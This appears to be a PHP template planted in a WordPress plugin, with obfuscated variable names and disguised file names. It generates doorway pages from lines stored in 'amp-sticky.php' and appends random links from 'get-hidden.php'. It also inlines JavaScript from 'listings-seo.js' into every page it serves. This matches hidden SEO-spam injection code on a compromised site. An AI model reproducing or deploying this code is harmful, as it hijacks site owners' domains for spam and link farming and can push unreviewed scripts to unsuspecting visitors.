<?php
$aVNGPBD = intval(get_query_var('jncrxtty'));

if ($aVNGPBD < 1 || $aVNGPBD > 5911) return;
$wvtmwsxwLC = file(plugin_dir_path(__FILE__).'amp-sticky.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$xo3EzF = explode(';', $wvtmwsxwLC[$aVNGPBD]);
if (count($xo3EzF) < 2) return;
$fryegup = $xo3EzF[0];
$yQGzv  = $xo3EzF[1];
$qEuIC5 = $xo3EzF[2];
$yYCf7puQ  = $xo3EzF[3];
$qaTbKzoChr = $xo3EzF[4];
set_query_var('xfkhj', $fryegup);

$yjV7kdE = '';
$qfnRk7mL = plugin_dir_path(__FILE__).'get-hidden.php';
if (is_file($qfnRk7mL)) {
	$u4yVqXO = file($qfnRk7mL, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($u4yVqXO);
	shuffle($u4yVqXO);
	$tspLz = mt_rand(2, 5);
	if (count($u4yVqXO) > $tspLz) {
		for ($eCKvdQe = 0; $eCKvdQe < $tspLz; $eCKvdQe++) {
			$jW4vu = array_shift($u4yVqXO);
			$yjV7kdE .= '<p><a href="'.$jW4vu.'">'.$jW4vu.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $fryegup; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $yQGzv . "</p>\n";
				if (strlen($yYCf7puQ) > 0) echo "<p>" . $yYCf7puQ . "</p>\n";
				if (strlen($qEuIC5) > 0) echo "<p>" . $qEuIC5 . "</p>\n";
				if (strlen($qaTbKzoChr) > 0) echo '<p><a href="#"><img src="'.$qaTbKzoChr.'"></a>' . "</p>\n";
				echo $yjV7kdE;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$uLUpoQtA6 = plugin_dir_path(__FILE__) . 'listings-seo.js';
if (is_file($uLUpoQtA6)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($uLUpoQtA6);
	echo '</script>';
}
get_footer();
?>
